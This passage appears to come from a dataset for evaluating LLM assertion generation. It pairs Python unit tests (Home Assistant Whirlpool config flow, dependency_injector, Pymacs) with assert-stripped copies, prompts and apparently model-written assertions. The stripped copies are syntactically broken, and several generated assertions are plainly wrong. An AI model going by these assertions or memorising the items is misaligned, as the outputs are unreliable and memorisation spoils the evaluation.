11DATABASE_URL = os.getenv('DATABASE_URL', DOCKER_COMPOSE_DB_URL.format(DOCKER_COMPOSE_DB_ADDR))
12
13DEFAULT_CARDS_CONFIG = {
14    'cards': (
15        'ACE_SPADES', '2_SPADES', '3_SPADES', '4_SPADES', '5_SPADES', '6_SPADES', '7_SPADES', '8_SPADES', '9_SPADES', '10_SPADES', 'JACK_SPADES', 'QUEEN_SPADES', 'KING_SPADES',
16        'ACE_DIAMONDS', '2_DIAMONDS', '3_DIAMONDS', '4_DIAMONDS', '5_DIAMONDS', '6_DIAMONDS', '7_DIAMONDS', '8_DIAMONDS', '9_DIAMONDS', '10_DIAMONDS', 'JACK_DIAMONDS', 'QUEEN_DIAMONDS', 'KING_DIAMONDS',
17        'ACE_CLUBS', '2_CLUBS', '3_CLUBS', '4_CLUBS', '5_CLUBS', '6_CLUBS', '7_CLUBS', '8_CLUBS', '9_CLUBS', '10_CLUBS', 'JACK_CLUBS', 'QUEEN_CLUBS', 'KING_CLUBS',
18        'ACE_HEARTS', '2_HEARTS', '3_HEARTS', '4_HEARTS', '5_HEARTS', '6_HEARTS', '7_HEARTS', '8_HEARTS', '9_HEARTS', '10_HEARTS', 'JACK_HEARTS', 'QUEEN_HEARTS', 'KING_HEARTS',
19    ),
20    'image_path': CARD_IMAGE_PATH
21}
22",2660,"[[4, 'API_KEY', '!=', None, ""API_KEY is needed for API operations""],
[6, 'CARD_IMAGE_PATH', '!=', None, ""CARD_IMAGE_PATH is needed to locate card images""],
[9, 'DOCKER_COMPOSE_DB_ADDR', '!=', None, ""DOCKER_COMPOSE_DB_ADDR is needed to format DOCKER_COMPOSE_DB_URL""],
[11, 'DATABASE_URL', '!=', None, ""DATABASE_URL is a required variable to connect to the database""],
[13, 'DEFAULT_CARDS_CONFIG', '==', 54, ""There should be 54 cards in the default card configuration""]]"
lukas-hetzenecker/home-assistant,"""""""Test the Whirlpool Sixth Sense config flow.""""""
import asyncio
from unittest.mock import patch

import aiohttp

from homeassistant import config_entries
from homeassistant.components.whirlpool.const import DOMAIN

from tests.common import MockConfigEntry


async def test_form(hass):
    """"""Test we get the form.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )

    assert result[""type""] == ""form""
    assert result[""step_id""] == config_entries.SOURCE_USER

    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
        return_value=True,
    ), patch(
        ""homeassistant.components.whirlpool.async_setup_entry"",
        return_value=True,
    ) as mock_setup_entry:
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
        await hass.async_block_till_done()

    assert result2[""type""] == ""create_entry""
    assert result2[""title""] == ""test-username""
    assert result2[""data""] == {
        ""username"": ""test-username"",
        ""password"": ""test-password"",
    }
    assert len(mock_setup_entry.mock_calls) == 1


async def test_form_invalid_auth(hass):
    """"""Test we handle invalid auth.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )
    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
        return_value=False,
    ):
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
    assert result2[""type""] == ""form""
    assert result2[""errors""] == {""base"": ""invalid_auth""}


async def test_form_cannot_connect(hass):
    """"""Test we handle cannot connect error.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )
    with patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
        side_effect=aiohttp.ClientConnectionError,
    ):
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
    assert result2[""type""] == ""form""
    assert result2[""errors""] == {""base"": ""cannot_connect""}


async def test_form_auth_timeout(hass):
    """"""Test we handle auth timeout error.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )
    with patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
        side_effect=asyncio.TimeoutError,
    ):
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
    assert result2[""type""] == ""form""
    assert result2[""errors""] == {""base"": ""cannot_connect""}


async def test_form_generic_auth_exception(hass):
    """"""Test we handle cannot connect error.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )
    with patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
        side_effect=Exception,
    ):
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
    assert result2[""type""] == ""form""
    assert result2[""errors""] == {""base"": ""unknown""}


async def test_form_already_configured(hass):
    """"""Test we handle cannot connect error.""""""
    mock_entry = MockConfigEntry(
        domain=DOMAIN,
        data={""username"": ""test-username"", ""password"": ""test-password""},
        unique_id=""test-username"",
    )
    mock_entry.add_to_hass(hass)

    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": config_entries.SOURCE_USER}
    )

    assert result[""type""] == ""form""
    assert result[""step_id""] == config_entries.SOURCE_USER

    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
        return_value=True,
    ):
        result2 = await hass.config_entries.flow.async_configure(
            result[""flow_id""],
            {
                ""username"": ""test-username"",
                ""password"": ""test-password"",
            },
        )
        await hass.async_block_till_done()

    assert result2[""type""] == ""abort""
    assert result2[""reason""] == ""already_configured""
","
1""""""Test the Whirlpool Sixth Sense config flow.""""""
2import asyncio
3from unittest.mock import patch
4
5import aiohttp
6
7from homeassistant import config_entries
8from homeassistant.components.whirlpool.const import DOMAIN
9
10from tests.common import MockConfigEntry
11
12
13async def test_form(hass):
14    """"""Test we get the form.""""""
15    result = await hass.config_entries.flow.async_init(
16        DOMAIN, context={""source"": config_entries.SOURCE_USER}
17    )
18
19
20    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
21        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
22        return_value=True,
23    ), patch(
24        ""homeassistant.components.whirlpool.async_setup_entry"",
25        return_value=True,
26    ) as mock_setup_entry:
27        result2 = await hass.config_entries.flow.async_configure(
28            result[""flow_id""],
29            {
30                ""username"": ""test-username"",
31                ""password"": ""test-password"",
32            },
33        )
34        await hass.async_block_till_done()
35
36        ""username"": ""test-username"",
37        ""password"": ""test-password"",
38    }
39
40
41async def test_form_invalid_auth(hass):
42    """"""Test we handle invalid auth.""""""
43    result = await hass.config_entries.flow.async_init(
44        DOMAIN, context={""source"": config_entries.SOURCE_USER}
45    )
46    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
47        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
48        return_value=False,
49    ):
50        result2 = await hass.config_entries.flow.async_configure(
51            result[""flow_id""],
52            {
53                ""username"": ""test-username"",
54                ""password"": ""test-password"",
55            },
56        )
57
58
59async def test_form_cannot_connect(hass):
60    """"""Test we handle cannot connect error.""""""
61    result = await hass.config_entries.flow.async_init(
62        DOMAIN, context={""source"": config_entries.SOURCE_USER}
63    )
64    with patch(
65        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
66        side_effect=aiohttp.ClientConnectionError,
67    ):
68        result2 = await hass.config_entries.flow.async_configure(
69            result[""flow_id""],
70            {
71                ""username"": ""test-username"",
72                ""password"": ""test-password"",
73            },
74        )
75
76
77async def test_form_auth_timeout(hass):
78    """"""Test we handle auth timeout error.""""""
79    result = await hass.config_entries.flow.async_init(
80        DOMAIN, context={""source"": config_entries.SOURCE_USER}
81    )
82    with patch(
83        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
84        side_effect=asyncio.TimeoutError,
85    ):
86        result2 = await hass.config_entries.flow.async_configure(
87            result[""flow_id""],
88            {
89                ""username"": ""test-username"",
90                ""password"": ""test-password"",
91            },
92        )
93
94
95async def test_form_generic_auth_exception(hass):
96    """"""Test we handle cannot connect error.""""""
97    result = await hass.config_entries.flow.async_init(
98        DOMAIN, context={""source"": config_entries.SOURCE_USER}
99    )
100    with patch(
101        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
102        side_effect=Exception,
103    ):
104        result2 = await hass.config_entries.flow.async_configure(
105            result[""flow_id""],
106            {
107                ""username"": ""test-username"",
108                ""password"": ""test-password"",
109            },
110        )
111
112
113async def test_form_already_configured(hass):
114    """"""Test we handle cannot connect error.""""""
115    mock_entry = MockConfigEntry(
116        domain=DOMAIN,
117        data={""username"": ""test-username"", ""password"": ""test-password""},
118        unique_id=""test-username"",
119    )
120    mock_entry.add_to_hass(hass)
121
122    result = await hass.config_entries.flow.async_init(
123        DOMAIN, context={""source"": config_entries.SOURCE_USER}
124    )
125
126
127    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
128        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
129        return_value=True,
130    ):
131        result2 = await hass.config_entries.flow.async_configure(
132            result[""flow_id""],
133            {
134                ""username"": ""test-username"",
135                ""password"": ""test-password"",
136            },
137        )
138        await hass.async_block_till_done()
139
140","[['result[""type""]', '==', '""form""'], ['result[""step_id""]', '==', 'config_entries.SOURCE_USER'], ['result2[""type""]', '==', '""create_entry""'], ['result2[""title""]', '==', '""test-username""'], ['result2[""data""]', '==', '{'], ['len(mock_setup_entry.mock_calls)', '==', '1'], ['result2[""type""]', '==', '""form""'], ['result2[""errors""]', '==', '{""base"": ""invalid_auth""}'], ['result2[""type""]', '==', '""form""'], ['result2[""errors""]', '==', '{""base"": ""cannot_connect""}'], ['result2[""type""]', '==', '""form""'], ['result2[""errors""]', '==', '{""base"": ""cannot_connect""}'], ['result2[""type""]', '==', '""form""'], ['result2[""errors""]', '==', '{""base"": ""unknown""}'], ['result[""type""]', '==', '""form""'], ['result[""step_id""]', '==', 'config_entries.SOURCE_USER'], ['result2[""type""]', '==', '""abort""'], ['result2[""reason""]', '==', '""already_configured""']]",18,18,1.0,0.0034416826003824,"['hass', 'result', 'result2', 'mock_entry']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['hass', 'result', 'result2', 'mock_entry']
*Code:

1""""""Test the Whirlpool Sixth Sense config flow.""""""
2import asyncio
3from unittest.mock import patch
4
5import aiohttp
6
7from homeassistant import config_entries
8from homeassistant.components.whirlpool.const import DOMAIN
9
10from tests.common import MockConfigEntry
11
12
13async def test_form(hass):
14    """"""Test we get the form.""""""
15    result = await hass.config_entries.flow.async_init(
16        DOMAIN, context={""source"": config_entries.SOURCE_USER}
17    )
18
19
20    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
21        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
22        return_value=True,
23    ), patch(
24        ""homeassistant.components.whirlpool.async_setup_entry"",
25        return_value=True,
26    ) as mock_setup_entry:
27        result2 = await hass.config_entries.flow.async_configure(
28            result[""flow_id""],
29            {
30                ""username"": ""test-username"",
31                ""password"": ""test-password"",
32            },
33        )
34        await hass.async_block_till_done()
35
36        ""username"": ""test-username"",
37        ""password"": ""test-password"",
38    }
39
40
41async def test_form_invalid_auth(hass):
42    """"""Test we handle invalid auth.""""""
43    result = await hass.config_entries.flow.async_init(
44        DOMAIN, context={""source"": config_entries.SOURCE_USER}
45    )
46    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
47        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
48        return_value=False,
49    ):
50        result2 = await hass.config_entries.flow.async_configure(
51            result[""flow_id""],
52            {
53                ""username"": ""test-username"",
54                ""password"": ""test-password"",
55            },
56        )
57
58
59async def test_form_cannot_connect(hass):
60    """"""Test we handle cannot connect error.""""""
61    result = await hass.config_entries.flow.async_init(
62        DOMAIN, context={""source"": config_entries.SOURCE_USER}
63    )
64    with patch(
65        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
66        side_effect=aiohttp.ClientConnectionError,
67    ):
68        result2 = await hass.config_entries.flow.async_configure(
69            result[""flow_id""],
70            {
71                ""username"": ""test-username"",
72                ""password"": ""test-password"",
73            },
74        )
75
76
77async def test_form_auth_timeout(hass):
78    """"""Test we handle auth timeout error.""""""
79    result = await hass.config_entries.flow.async_init(
80        DOMAIN, context={""source"": config_entries.SOURCE_USER}
81    )
82    with patch(
83        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
84        side_effect=asyncio.TimeoutError,
85    ):
86        result2 = await hass.config_entries.flow.async_configure(
87            result[""flow_id""],
88            {
89                ""username"": ""test-username"",
90                ""password"": ""test-password"",
91            },
92        )
93
94
95async def test_form_generic_auth_exception(hass):
96    """"""Test we handle cannot connect error.""""""
97    result = await hass.config_entries.flow.async_init(
98        DOMAIN, context={""source"": config_entries.SOURCE_USER}
99    )
100    with patch(
101        ""homeassistant.components.whirlpool.config_flow.Auth.do_auth"",
102        side_effect=Exception,
103    ):
104        result2 = await hass.config_entries.flow.async_configure(
105            result[""flow_id""],
106            {
107                ""username"": ""test-username"",
108                ""password"": ""test-password"",
109            },
110        )
111
112
113async def test_form_already_configured(hass):
114    """"""Test we handle cannot connect error.""""""
115    mock_entry = MockConfigEntry(
116        domain=DOMAIN,
117        data={""username"": ""test-username"", ""password"": ""test-password""},
118        unique_id=""test-username"",
119    )
120    mock_entry.add_to_hass(hass)
121
122    result = await hass.config_entries.flow.async_init(
123        DOMAIN, context={""source"": config_entries.SOURCE_USER}
124    )
125
126
127    with patch(""homeassistant.components.whirlpool.config_flow.Auth.do_auth""), patch(
128        ""homeassistant.components.whirlpool.config_flow.Auth.is_access_token_valid"",
129        return_value=True,
130    ):
131        result2 = await hass.config_entries.flow.async_configure(
132            result[""flow_id""],
133            {
134                ""username"": ""test-username"",
135                ""password"": ""test-password"",
136            },
137        )
138        await hass.async_block_till_done()
139
140",6137,"[[14, 'hass', '!=', None, 'hass object needs to exist for function to execute'],
 [27, 'result', '!=', None, 'result must be initialized prior to use'],
 [51, 'result', '!=', None, 'result must be initialized prior to use'],
 [68, 'result', '!=', None, 'result must be initialized prior to use'],
 [86, 'result', '!=', None, 'result must be initialized prior to use'],
 [104, 'result', '!=', None, 'result must be initialized prior to use'],
 [131, 'result', '!=', None, 'result must be initialized prior to use']]"
ets-labs/dependency_injector,"""""""Delegate provider traversal tests.""""""

from dependency_injector import providers


def test_traversal_provider():
    another_provider = providers.Provider()
    provider = providers.Delegate(another_provider)

    all_providers = list(provider.traverse())

    assert len(all_providers) == 1
    assert another_provider in all_providers


def test_traversal_provider_and_overriding():
    provider1 = providers.Provider()
    provider2 = providers.Provider()

    provider3 = providers.Provider()
    provider3.override(provider2)

    provider = providers.Delegate(provider1)

    provider.override(provider3)

    all_providers = list(provider.traverse())

    assert len(all_providers) == 3
    assert provider1 in all_providers
    assert provider2 in all_providers
    assert provider3 in all_providers
","
1""""""Delegate provider traversal tests.""""""
2
3from dependency_injector import providers
4
5
6def test_traversal_provider():
7    another_provider = providers.Provider()
8    provider = providers.Delegate(another_provider)
9
10    all_providers = list(provider.traverse())
11
12
13
14def test_traversal_provider_and_overriding():
15    provider1 = providers.Provider()
16    provider2 = providers.Provider()
17
18    provider3 = providers.Provider()
19    provider3.override(provider2)
20
21    provider = providers.Delegate(provider1)
22
23    provider.override(provider3)
24
25    all_providers = list(provider.traverse())
26
27","[['len(all_providers)', '==', '1'], ['len(all_providers)', '==', '3']]",6,2,0.3333333333333333,0.0024630541871921,"['another_provider', 'provider', 'all_providers', 'provider1', 'provider2', 'provider3']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['another_provider', 'provider', 'all_providers', 'provider1', 'provider2', 'provider3']
*Code:

1""""""Delegate provider traversal tests.""""""
2
3from dependency_injector import providers
4
5
6def test_traversal_provider():
7    another_provider = providers.Provider()
8    provider = providers.Delegate(another_provider)
9
10    all_providers = list(provider.traverse())
11
12
13
14def test_traversal_provider_and_overriding():
15    provider1 = providers.Provider()
16    provider2 = providers.Provider()
17
18    provider3 = providers.Provider()
19    provider3.override(provider2)
20
21    provider = providers.Delegate(provider1)
22
23    provider.override(provider3)
24
25    all_providers = list(provider.traverse())
26
27",2097,"[[6, 'another_provider', '!=', None, 'the provider cannot be None'],
 [6, 'provider', '!=', None, 'the provider cannot be None'],
 [10, 'all_providers', '!=', None, 'the list of providers cannot be None'],
 [10, 'all_providers', '==', 0, 'the list of providers should be empty before traversal'],
 [14, 'provider1', '!=', None, 'the provider cannot be None'],
 [14, 'provider2', '!=', None, 'the provider cannot be None'],
 [14, 'provider3', '!=', None, 'the provider cannot be None'],
 [21, 'provider', '!=', None, 'the provider cannot be None'],
 [25, 'all_providers', '!=', None, 'the list of providers cannot be None'],
 [25, 'all_providers', '==', 0, 'the list of providers should be empty before traversal']]"
jachinpy/emacs.d,"# -*- coding: utf-8 -*-

# Checking if Emacs loads the Python helper.

import setup

def test_1():
    setup.start_emacs()
    output = setup.ask_emacs(('(progn\n'
                              '  (pymacs-start-services)\n'
                              '  (not (null pymacs-transit-buffer)))\n'),
                             'prin1')
    assert output == 't', output
    setup.stop_emacs()
","
1# -*- coding: utf-8 -*-
2
3# Checking if Emacs loads the Python helper.
4
5import setup
6
7def test_1():
8    setup.start_emacs()
9    output = setup.ask_emacs(('(progn\n'
10                              '  (pymacs-start-services)\n'
11                              '  (not (null pymacs-transit-buffer)))\n'),
12                             'prin1')
13    setup.stop_emacs()
14","[['output', '==', ""'t'""]]",1,1,1.0,0.0025510204081632,['output'],1,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['output']
*Code:

1# -*- coding: utf-8 -*-
2
3# Checking if Emacs loads the Python helper.
4
5import setup
6
7def test_1():
8    setup.start_emacs()
9    output = setup.ask_emacs(('(progn\n'
10                              '  (pymacs-start-services)\n'
11                              '  (not (null pymacs-transit-buffer)))\n'),
12                             'prin1')
13    setup.stop_emacs()
14",1769,"[8, 'output', '==', None, ""before function call, the output variable should be None""],
[13, 'output', '!=', None, ""after calling the function, the output variable should no longer be None""]"
